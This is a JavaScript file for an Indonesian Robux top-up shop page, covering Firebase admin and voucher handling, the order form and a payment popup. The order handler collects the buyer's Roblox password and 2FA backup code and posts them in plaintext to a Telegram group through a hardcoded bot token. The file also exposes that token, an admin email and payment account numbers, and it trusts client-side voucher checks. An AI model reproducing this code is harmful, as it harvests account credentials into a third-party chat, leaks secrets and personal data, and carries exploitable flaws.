// app.js (ESM module, langsung jalan di browser)

// =======================
// 1) FIREBASE SETUP (CDN)
// =======================
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-analytics.js";

import {
  getFirestore,
  doc,
  getDoc,
  onSnapshot,
  setDoc,
  serverTimestamp,
  runTransaction,
} from "https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js";

import {
  getAuth,
  GoogleAuthProvider,
  signInWithPopup,
  onAuthStateChanged,
  signOut,
} from "https://www.gstatic.com/firebasejs/12.8.0/firebase-auth.js";

// >>> CONFIG PROJECT BARU
const firebaseConfig = {
  apiKey: "AIzaSyDegaa_LpfhS7UuHhSi9PzCZqRCNxnQfjQ",
  authDomain: "autoorderalyze.firebaseapp.com",
  projectId: "autoorderalyze",
  storageBucket: "autoorderalyze.firebasestorage.app",
  messagingSenderId: "492584862389",
  appId: "1:492584862389:web:f23ce07f993efb184934fc",
  measurementId: "G-HYWMBCR1VV",
};

const ADMIN_EMAIL = "dinijanuari23@gmail.com";
const STORE_DOC_PATH = ["settings", "store"]; // collection: settings, doc: store

// Voucher TPG one-time global
const VOUCHER_COLLECTION = "vouchers_used"; // doc id = kode voucher

// Voucher manual + limit global
const VOUCHERS_COLLECTION = "vouchers"; // doc id = kode voucher manual
const VOUCHER_USES_COLLECTION = "voucher_uses"; // log pemakaian (optional)

const wantAdminPanel = new URLSearchParams(window.location.search).get("admin") === "1";

const app = initializeApp(firebaseConfig);
getAnalytics(app);

const db = getFirestore(app);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

let storeOpen = true;
let isAdmin = false;

// =======================
// 2) UTIL UI
// =======================
function sanitize(v) {
  return v ? Number(String(v).replace(/\D+/g, "")) : NaN;
}
function formatRupiah(num) {
  return "Rp" + new Intl.NumberFormat("id-ID").format(num);
}

function fill({ nmText, hgRaw, ktVal }) {
  document.getElementById("nm").value = nmText || "";
  document.getElementById("kt").value = ktVal || "";

  const h = sanitize(hgRaw);
  document.getElementById("hg").value = !isNaN(h) ? formatRupiah(h) : hgRaw || "";

  const el = document.querySelector(".form-container") || document.getElementById("orderSection");
  if (el) el.scrollIntoView({ behavior: "smooth", block: "center" });
}

// Popup iOS-like
function showValidationPopupCenter(title, message, submessage) {
  const existing = document.getElementById("validationCenterPopup");
  if (existing) existing.remove();

  const container = document.getElementById("validationContainer") || document.body;

  const popup = document.createElement("div");
  popup.id = "validationCenterPopup";
  popup.className = "validation-center";
  popup.tabIndex = -1;

  const safeTitle = title || "Notification";
  const safeMsg = message || "";
  const safeSub = submessage || "";

  popup.innerHTML = `
    <div class="hdr">${safeTitle}</div>
    <div class="divider"></div>
    <div class="txt">${safeMsg}</div>
    ${safeSub ? `<div class="subtxt">${safeSub}</div>` : ``}
    <div class="btnRow">
      <button type="button" class="okbtn">OK</button>
    </div>
  `;

  container.appendChild(popup);

  const okBtn = popup.querySelector(".okbtn");

  function removePopup() {
    popup.style.transition = "opacity 160ms ease, transform 160ms ease";
    popup.style.opacity = "0";
    popup.style.transform = "translate(-50%,-50%) scale(.98)";
    setTimeout(() => popup.remove(), 170);
  }

  okBtn.addEventListener("click", removePopup);
  popup.focus({ preventScroll: true });

  const t = setTimeout(removePopup, 7000);
  window.addEventListener(
    "pagehide",
    () => {
      clearTimeout(t);
      if (popup) popup.remove();
    },
    { once: true }
  );
}

function applyStoreStatusUI() {
  const badge = document.getElementById("adminBadge");
  if (badge) {
    badge.textContent = storeOpen ? "OPEN" : "CLOSED";
    badge.style.borderColor = storeOpen ? "#bbf7d0" : "#fecaca";
    badge.style.background = storeOpen ? "#ecfdf5" : "#fef2f2";
    badge.style.color = storeOpen ? "#14532d" : "#7f1d1d";
  }

  const btn = document.getElementById("btnTg");
  if (btn) btn.disabled = false;
}

function applyAdminUI(user) {
  const panel = document.getElementById("adminPanel");
  const btnLogin = document.getElementById("btnAdminLogin");
  const btnLogout = document.getElementById("btnAdminLogout");
  const emailEl = document.getElementById("adminEmail");
  const btnSetOpen = document.getElementById("btnSetOpen");
  const btnSetClose = document.getElementById("btnSetClose");

  if (!panel) return;

  panel.style.display = wantAdminPanel ? "block" : "none";
  if (!btnLogin || !btnLogout || !emailEl || !btnSetOpen || !btnSetClose) return;

  if (user) {
    btnLogin.style.display = "none";
    btnLogout.style.display = "inline-block";
    emailEl.textContent = user.email || "";
  } else {
    btnLogin.style.display = "inline-block";
    btnLogout.style.display = "none";
    emailEl.textContent = "";
  }

  btnSetOpen.disabled = !isAdmin;
  btnSetClose.disabled = !isAdmin;

  const btnCreateVoucher = document.getElementById("btnCreateVoucher");
  if (btnCreateVoucher) btnCreateVoucher.disabled = !isAdmin;
}

async function setStoreOpen(flag) {
  if (!isAdmin) {
    showValidationPopupCenter("Notification", "Akses ditolak", "Hanya admin yang bisa mengubah status.");
    return;
  }
  const ref = doc(db, STORE_DOC_PATH[0], STORE_DOC_PATH[1]);
  await setDoc(ref, { open: !!flag, updatedAt: serverTimestamp() }, { merge: true });
}

// =======================
// 2c) VOUCHER PREVIEW UI
// =======================
function setVoucherPreview(text, mode = "info") {
  const el = document.getElementById("voucherPreview");
  if (!el) return;

  if (!text) {
    el.style.display = "none";
    el.textContent = "";
    el.style.color = "";
    return;
  }

  el.style.display = "block";
  el.textContent = text;

  if (mode === "ok") el.style.color = "#15803d";
  else if (mode === "bad") el.style.color = "#b91c1c";
  else el.style.color = "#555";
}

function debounce(fn, wait = 350) {
  let t;
  return (...args) => {
    clearTimeout(t);
    t = setTimeout(() => fn(...args), wait);
  };
}

// =======================
// 2b) VOUCHER
// =======================

// Voucher TPG: TPG(100-400)VCMEM(1-99999)
function parseVoucherTPG(raw) {
  const code = String(raw || "").trim().toUpperCase();
  if (!code) return null;

  const m = code.match(/^TPG(\d{3})VCMEM([1-9]\d{0,4})$/);
  if (!m) return { ok: false, code, reason: "Format voucher tidak valid." };

  const tpg = Number(m[1]);
  const serial = Number(m[2]);

  if (tpg < 100 || tpg > 400) return { ok: false, code, reason: "Kode TPG harus 100–400." };
  if (serial < 1 || serial > 99999) return { ok: false, code, reason: "Angka belakang harus 1–99999." };

  const discount = tpg * 10;
  return { ok: true, code, tpg, serial, discount };
}

// Preview voucher (tanpa claim)
async function previewVoucher(rawCode, basePrice) {
  const code = String(rawCode || "").trim().toUpperCase();
  if (!code) return { ok: false, empty: true };

  // TPG
  const parsed = parseVoucherTPG(code);
  if (parsed && parsed.ok) {
    const discount = parsed.discount;
    const finalPrice = Math.max(0, basePrice - discount);
    return { ok: true, type: "TPG", code: parsed.code, discount, finalPrice };
  }

  // Manual voucher
  const vRef = doc(db, VOUCHERS_COLLECTION, code);
  const snap = await getDoc(vRef);
  if (!snap.exists()) return { ok: false, reason: "Voucher tidak ditemukan." };

  const data = snap.data() || {};
  const discount = Number(data.discount || 0);
  const limit = Number(data.limit || 0);
  const usedCount = Number(data.usedCount || 0);

  if (limit < 1) return { ok: false, reason: "Voucher tidak aktif." };
  if (usedCount >= limit) return { ok: false, reason: "Voucher sudah mencapai limit." };

  const finalPrice = Math.max(0, basePrice - discount);
  return { ok: true, type: "MANUAL", code, discount, finalPrice, limit, usedCount };
}

// Claim voucher TPG once (rules: create-only)
async function claimVoucherOnce(voucherCode, orderMeta) {
  const ref = doc(db, VOUCHER_COLLECTION, voucherCode);
  await setDoc(ref, {
    usedAt: serverTimestamp(),
    ...orderMeta,
  });
}

// Claim voucher manual (limit global) + log use
async function claimManualVoucher(codeRaw, orderMeta) {
  const code = String(codeRaw || "").trim().toUpperCase();
  if (!code) return null;

  const vRef = doc(db, VOUCHERS_COLLECTION, code);

  const res = await runTransaction(db, async (tx) => {
    const snap = await tx.get(vRef);
    if (!snap.exists()) throw new Error("Voucher tidak ditemukan.");

    const data = snap.data() || {};
    const discount = Number(data.discount || 0);
    const limit = Number(data.limit || 0);
    const usedCount = Number(data.usedCount || 0);

    if (limit < 1) throw new Error("Voucher tidak aktif.");
    if (usedCount >= limit) throw new Error("Voucher sudah mencapai limit.");

    tx.set(vRef, { usedCount: usedCount + 1 }, { merge: true });

    const useId = `${code}_${Date.now()}_${Math.random().toString(16).slice(2)}`;
    const useRef = doc(db, VOUCHER_USES_COLLECTION, useId);
    tx.set(useRef, { code, usedAt: serverTimestamp(), ...orderMeta });

    return { code, discount, limit, usedCount: usedCount + 1 };
  });

  return res;
}

// Admin create/update voucher manual
async function adminUpsertManualVoucher(codeRaw, discountRaw, limitRaw) {
  if (!isAdmin) throw new Error("Akses ditolak.");

  const code = String(codeRaw || "").trim().toUpperCase();
  const discount = Number(discountRaw);
  const limit = Number(limitRaw);

  if (!code) throw new Error("Kode voucher wajib diisi.");
  if (!Number.isFinite(discount) || discount < 0) throw new Error("Potongan harus angka >= 0.");
  if (!Number.isFinite(limit) || limit < 1) throw new Error("Limit minimal 1.");

  const vRef = doc(db, VOUCHERS_COLLECTION, code);

  const existing = await getDoc(vRef);
  const existingUsed = existing.exists() ? Number(existing.data()?.usedCount || 0) : 0;

  await setDoc(
    vRef,
    {
      code,
      discount,
      limit,
      usedCount: existingUsed,
      updatedAt: serverTimestamp(),
      updatedBy: ADMIN_EMAIL,
    },
    { merge: true }
  );

  return code;
}

// =======================
// 3) LOGIC + FIREBASE LISTENERS
// =======================
document.addEventListener("DOMContentLoaded", function () {
  // klik pricelist -> isi form
  document.querySelectorAll(".bc").forEach((b) => {
    b.addEventListener("click", () =>
      fill({
        nmText: b.getAttribute("data-nm") || b.textContent.trim(),
        hgRaw: b.getAttribute("data-hg") || "",
        ktVal: b.getAttribute("data-kt") || "",
      })
    );
  });

  // robux fields
  const usrEl = document.getElementById("usr");
  const pwdEl = document.getElementById("pwd");
  const v2El = document.getElementById("v2");
  const v2mEl = document.getElementById("v2m");
  const bcEl = document.getElementById("bc");

  const v2mDiv = document.getElementById("v2m_div");
  const bcDiv = document.getElementById("bc_div");
  const emDiv = document.getElementById("em_div");

  const voucherEl = document.getElementById("voucher");

  // show/hide V2L stuff
  function setHidden(el, hidden) {
    if (!el) return;
    el.classList.toggle("hidden", !!hidden);
  }
  function setRequired(id, req) {
    const el = document.getElementById(id);
    if (!el) return;
    if (req) el.setAttribute("required", "required");
    else el.removeAttribute("required");
  }
  function resetV2Sub() {
    setHidden(v2mDiv, true);
    setHidden(bcDiv, true);
    setHidden(emDiv, true);

    if (v2mEl) v2mEl.value = "";
    if (bcEl) bcEl.value = "";

    setRequired("v2m", false);
    setRequired("bc", false);
  }
  function applyV2UI() {
    const v2 = String(v2El?.value || "");
    if (v2 === "ON") {
      setHidden(v2mDiv, false);
      setRequired("v2m", true);

      const m = String(v2mEl?.value || "");
      if (m === "BC") {
        setHidden(bcDiv, false);
        setHidden(emDiv, true);
        setRequired("bc", true);
      } else if (m === "EM") {
        setHidden(bcDiv, true);
        setHidden(emDiv, false);
        setRequired("bc", false);
      } else {
        setHidden(bcDiv, true);
        setHidden(emDiv, true);
        setRequired("bc", false);
      }
    } else {
      resetV2Sub();
    }
  }

  v2El?.addEventListener("change", applyV2UI);
  v2mEl?.addEventListener("change", applyV2UI);
  applyV2UI();

  // store listener
  const storeRef = doc(db, STORE_DOC_PATH[0], STORE_DOC_PATH[1]);
  onSnapshot(
    storeRef,
    (snap) => {
      if (snap.exists()) {
        const data = snap.data();
        storeOpen = data.open !== false;
      } else {
        storeOpen = true;
      }
      applyStoreStatusUI();
    },
    () => {
      storeOpen = true;
      applyStoreStatusUI();
    }
  );

  // admin auth
  onAuthStateChanged(auth, (user) => {
    isAdmin = !!(user && (user.email || "").toLowerCase() === ADMIN_EMAIL.toLowerCase());
    applyAdminUI(user);

    if (user && !isAdmin) {
      signOut(auth).catch(() => {});
      showValidationPopupCenter("Notification", "Akses ditolak", "Email ini bukan admin.");
    }
  });

  applyAdminUI(null);

  document.getElementById("btnAdminLogin")?.addEventListener("click", async () => {
    try {
      await signInWithPopup(auth, provider);
    } catch (e) {
      showValidationPopupCenter("Notification", "Login gagal", "Login dibatalkan / gagal.");
    }
  });

  document.getElementById("btnAdminLogout")?.addEventListener("click", async () => {
    try {
      await signOut(auth);
    } catch (e) {}
  });

  document.getElementById("btnSetOpen")?.addEventListener("click", () => setStoreOpen(true));
  document.getElementById("btnSetClose")?.addEventListener("click", () => setStoreOpen(false));

  // ADMIN: create/update voucher manual
  document.getElementById("btnCreateVoucher")?.addEventListener("click", async () => {
    try {
      const code = document.getElementById("adminVoucherCode")?.value || "";
      const disc = document.getElementById("adminVoucherDiscount")?.value || "";
      const lim = document.getElementById("adminVoucherLimit")?.value || "";

      const savedCode = await adminUpsertManualVoucher(code, disc, lim);
      showValidationPopupCenter("Notification", "Berhasil", `Voucher ${savedCode} disimpan.`);
    } catch (e) {
      showValidationPopupCenter("Notification", "Gagal", e?.message || "Tidak bisa menyimpan voucher.");
    }
  });

  // =======================
  // VOUCHER PREVIEW (realtime)
  // =======================
  const updateVoucherPreview = debounce(async () => {
    const raw = String(voucherEl?.value || "").trim();
    const hgText = document.getElementById("hg")?.value || "";
    const basePrice = sanitize(hgText);

    if (!raw) {
      setVoucherPreview("", "info");
      return;
    }

    if (isNaN(basePrice) || basePrice <= 0) {
      setVoucherPreview("Pilih nominal dulu untuk melihat total.", "info");
      return;
    }

    setVoucherPreview("Cek voucher...", "info");

    try {
      const res = await previewVoucher(raw, basePrice);
      if (!res.ok) {
        setVoucherPreview(`Voucher tidak valid: ${res.reason || "Tidak bisa dipakai."}`, "bad");
        return;
      }

      setVoucherPreview(
        `✅ Voucher dapat digunakan. (${res.code}) — Total harga: ${formatRupiah(res.finalPrice)}`,
        "ok"
      );
    } catch (e) {
      setVoucherPreview("Gagal cek voucher. Coba lagi.", "bad");
    }
  }, 450);

  voucherEl?.addEventListener("input", updateVoucherPreview);
  voucherEl?.addEventListener("blur", updateVoucherPreview);

  // refresh preview setelah pilih nominal
  document.querySelectorAll(".bc").forEach((b) => {
    b.addEventListener("click", () => setTimeout(updateVoucherPreview, 0));
  });

  // =======================
  // BTN PESAN
  // =======================
  document.getElementById("btnTg")?.addEventListener("click", async () => {
    if (!storeOpen) {
      showValidationPopupCenter(
        "Notification",
        "SEDANG ISTIRAHAT/CLOSE",
        "Mohon maaf, saat ini kamu belum bisa melakukan pemesanan."
      );
      return;
    }

    const f = document.getElementById("frm");
    const req = f.querySelectorAll("input[required], select[required]");

    for (const i of req) {
      if (!String(i.value || "").trim()) {
        showValidationPopupCenter("Notification", "Oops", "Harap isi semua kolom yang diwajibkan!");
        i.focus();
        return;
      }
    }

    const usr = usrEl?.value || "";
    const pwd = pwdEl?.value || "";
    const v2 = v2El?.value || "";
    const v2m = v2mEl?.value || "";
    const bc = bcEl?.value || "";

    const kt = document.getElementById("kt")?.value || "";
    const nm = document.getElementById("nm")?.value || "";
    const hgText = document.getElementById("hg")?.value || "";

    const basePrice = sanitize(hgText);
    if (isNaN(basePrice) || basePrice <= 0) {
      showValidationPopupCenter("Notification", "Oops", "Pilih nominal dulu ya.");
      return;
    }

    // Validasi V2L logic
    if (String(v2) === "ON") {
      if (!String(v2m).trim()) {
        showValidationPopupCenter("Notification", "Oops", "Pilih Metode V2L dulu ya.");
        v2mEl?.focus();
        return;
      }
      if (String(v2m) === "BC" && !String(bc).trim()) {
        showValidationPopupCenter("Notification", "Oops", "Isi Backup Code dulu ya.");
        bcEl?.focus();
        return;
      }
    }

    // Voucher (opsional)
    let voucherCodeUsed = "";
    let discount = 0;
    let finalPrice = basePrice;

    const rawVoucher = String(voucherEl?.value || "").trim();
    if (rawVoucher) {
      const parsedTPG = parseVoucherTPG(rawVoucher);

      if (parsedTPG && parsedTPG.ok) {
        // TPG one-time
        voucherCodeUsed = parsedTPG.code;
        discount = parsedTPG.discount;
        finalPrice = Math.max(0, basePrice - discount);

        try {
          await claimVoucherOnce(parsedTPG.code, {
            usr,
            v2,
            v2m,
            product: nm,
            basePrice,
            discount,
            finalPrice,
            type: "TPG",
            page: "ROBUX",
          });

          document.getElementById("hg").value = formatRupiah(finalPrice);
        } catch (e) {
          showValidationPopupCenter(
            "Notification",
            "Voucher tidak bisa dipakai",
            "Voucher sudah dipakai / tidak tersedia."
          );
          voucherEl?.focus();
          return;
        }
      } else {
        // Manual voucher with limit
        try {
          const claimed = await claimManualVoucher(rawVoucher, {
            usr,
            v2,
            v2m,
            product: nm,
            basePrice,
            type: "MANUAL",
            page: "ROBUX",
          });

          voucherCodeUsed = claimed.code;
          discount = Number(claimed.discount || 0);
          finalPrice = Math.max(0, basePrice - discount);

          document.getElementById("hg").value = formatRupiah(finalPrice);
        } catch (e) {
          showValidationPopupCenter(
            "Notification",
            "Voucher tidak bisa dipakai",
            e?.message || "Voucher invalid/limit."
          );
          voucherEl?.focus();
          return;
        }
      }
    }

    // Telegram
    const token = "1868293159:AAF7IWMtOEqmVqEkBAfCTexkj_siZiisC0E";
    const chatId = "-1003629941301";

    let txt =
      "Pesanan Baru Masuk! (ROBUX)\n\n" +
      "Username: " +
      usr +
      "\n" +
      "Password: " +
      pwd +
      "\n" +
      "V2L: " +
      v2 +
      "\n";

    if (String(v2) === "ON") {
      txt += "Metode V2L: " + (v2m || "-") + "\n";
      if (String(v2m) === "BC") txt += "Backup Code: " + (bc || "-") + "\n";
      if (String(v2m) === "EM") txt += "Metode: Kode Email (standby)\n";
    }

    txt +=
      "\nKategori: " +
      kt +
      "\n" +
      "Nominal: " +
      nm +
      "\n" +
      "Harga Awal: " +
      formatRupiah(basePrice);

    if (voucherCodeUsed) {
      txt +=
        "\nVoucher: " +
        voucherCodeUsed +
        "\nPotongan: -" +
        formatRupiah(discount) +
        "\nTotal: " +
        formatRupiah(finalPrice);
    } else {
      txt += "\nTotal: " + formatRupiah(finalPrice);
    }

    fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: txt }),
    })
      .then((res) => {
        if (res.ok) {
          const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
          showPaymentPopup(qrUrl, formatRupiah(finalPrice));
          f.reset();
          applyV2UI();
          setVoucherPreview("", "info");
        } else {
          alert("Gagal kirim ke Telegram");
        }
      })
      .catch(() => alert("Terjadi kesalahan."));
  });

  /* ==== PAYMENT POPUP (kode kamu, tidak diubah) ==== */
  function showPaymentPopup(qrUrl, hargaFormatted) {
    const backdrop = document.getElementById("paymentModalBackdrop");
    const modalQr = document.getElementById("modalQr");
    const modalAmount = document.getElementById("modalAmount");
    const copySuccess = document.getElementById("copySuccess");

    const walletLabel = document.getElementById("walletLabel");
    const walletNumberTitle = document.getElementById("walletNumberTitle");
    const walletNumber = document.getElementById("walletNumber");
    const walletNumberWrapper = document.getElementById("walletNumberWrapper");
    const walletNote = document.getElementById("walletNote");
    const copyNumberBtn = document.getElementById("copyNumberBtn");

    const methodButtons = document.querySelectorAll(".method-btn");
    const copyAmountBtn = document.getElementById("copyAmountBtn");

    const GOPAY_NUMBER = "083197962700";
    const DANA_NUMBER = "083197962700";
    const SEABANK_NUMBER = "901673348752";

    const baseAmount = (function () {
      const num = Number(String(hargaFormatted).replace(/[^\d]/g, ""));
      return isNaN(num) ? 0 : num;
    })();

    function formatRupiahLocal(num) {
      return "Rp" + new Intl.NumberFormat("id-ID").format(num);
    }

    const METHOD_CONFIG = {
      qris: {
        label: "QRIS (scan QR di atas)",
        numberTitle: "",
        number: "",
        calcTotal: (base) => {
          if (base <= 499000) return base;
          const fee = Math.round(base * 0.003);
          return base + fee;
        },
        note: "QRIS hingga Rp499.000 tidak ada biaya tambahan. Di atas itu akan dikenakan biaya 0,3% dari nominal.",
        showNumber: false,
      },
      gopay: {
        label: "Transfer GoPay ke GoPay",
        numberTitle: "No HP GoPay",
        number: GOPAY_NUMBER,
        calcTotal: (base) => base,
        note: "Pembayaran GoPay tidak ada biaya tambahan. Bayar sesuai nominal yang tertera.",
        showNumber: true,
      },
      seabank: {
        label: "Transfer SeaBank",
        numberTitle: "No rekening SeaBank",
        number: SEABANK_NUMBER,
        calcTotal: (base) => base,
        note: "SeaBank tidak ada biaya tambahan. Bayar sesuai nominal yang tertera.",
        showNumber: true,
      },
      dana: {
        label: "Transfer dari DANA KE DANA",
        numberTitle: "No HP DANA",
        number: DANA_NUMBER,
        calcTotal: (base) => base + 100,
        note: "Pembayaran DANA wajib transfer dari DANA. Dikenakan biaya admin Rp100. Total sudah termasuk biaya admin.",
        showNumber: true,
      },
    };

    function showMessage(msg) {
      copySuccess.textContent = msg;
      copySuccess.style.display = "block";
      setTimeout(() => (copySuccess.style.display = "none"), 2500);
    }

    function fallbackCopy(text, successMsg) {
      const tmp = document.createElement("textarea");
      tmp.value = text;
      document.body.appendChild(tmp);
      tmp.select();
      try {
        document.execCommand("copy");
        showMessage(successMsg);
      } catch (e) {
        showMessage("Tidak dapat menyalin, silakan salin manual.");
      }
      document.body.removeChild(tmp);
    }

    function copyTextToClipboard(text, successMsg) {
      if (!text) return;
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard
          .writeText(text)
          .then(() => showMessage(successMsg))
          .catch(() => fallbackCopy(text, successMsg));
      } else {
        fallbackCopy(text, successMsg);
      }
    }

    function applyMethod(methodKey) {
      methodButtons.forEach((btn) => btn.classList.toggle("active", btn.dataset.method === methodKey));
      const cfg = METHOD_CONFIG[methodKey];

      walletLabel.textContent = cfg.label;
      walletNote.textContent = cfg.note;

      const total = cfg.calcTotal(baseAmount);
      modalAmount.textContent = formatRupiahLocal(total);

      if (cfg.showNumber) {
        walletNumberTitle.textContent = cfg.numberTitle;
        walletNumber.textContent = cfg.number;
        walletNumberWrapper.style.display = "block";
        copyNumberBtn.style.display = "block";
      } else {
        walletNumberWrapper.style.display = "none";
        copyNumberBtn.style.display = "none";
      }

      if (methodKey === "qris") {
        modalQr.style.display = "block";
        modalQr.src = qrUrl;
      } else {
        modalQr.style.display = "none";
      }
    }

    applyMethod("qris");

    copySuccess.style.display = "none";
    backdrop.style.display = "flex";
    backdrop.setAttribute("aria-hidden", "false");

    methodButtons.forEach((btn) => {
      btn.onclick = function () {
        applyMethod(this.dataset.method);
      };
    });

    document.getElementById("closeModalBtn").onclick = function () {
      backdrop.style.display = "none";
      backdrop.setAttribute("aria-hidden", "true");
    };
    backdrop.onclick = function (e) {
      if (e.target === backdrop) {
        backdrop.style.display = "none";
        backdrop.setAttribute("aria-hidden", "true");
      }
    };

    copyNumberBtn.onclick = function () {
      copyTextToClipboard(walletNumber.textContent || "", "Nomor berhasil disalin");
    };

    copyAmountBtn.onclick = function () {
      copyTextToClipboard(modalAmount.textContent || "", "Jumlah berhasil disalin");
    };

    document.getElementById("openBotBtn").onclick = function () {
      const botUsername = "topupgamesbot";
      const tgScheme = "tg://resolve?domain=" + encodeURIComponent(botUsername);
      const webLink = "https://t.me/" + encodeURIComponent(botUsername) + "?start";
      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

      let appOpened = false;
      function onVisibilityChange() {
        if (document.hidden) appOpened = true;
      }
      document.addEventListener("visibilitychange", onVisibilityChange);

      try {
        if (isMobile) {
          window.location.href = tgScheme;
        } else {
          const newWin = window.open(tgScheme, "_blank");
          if (newWin) {
            try {
              newWin.focus();
            } catch (e) {}
          }
        }
      } catch (e) {}

      const fallbackTimeout = setTimeout(function () {
        if (!appOpened) window.open(webLink, "_blank");
        document.removeEventListener("visibilitychange", onVisibilityChange);
      }, 800);

      window.addEventListener("pagehide", function cleanup() {
        clearTimeout(fallbackTimeout);
        document.removeEventListener("visibilitychange", onVisibilityChange);
        window.removeEventListener("pagehide", cleanup);
      });
    };
  }
});
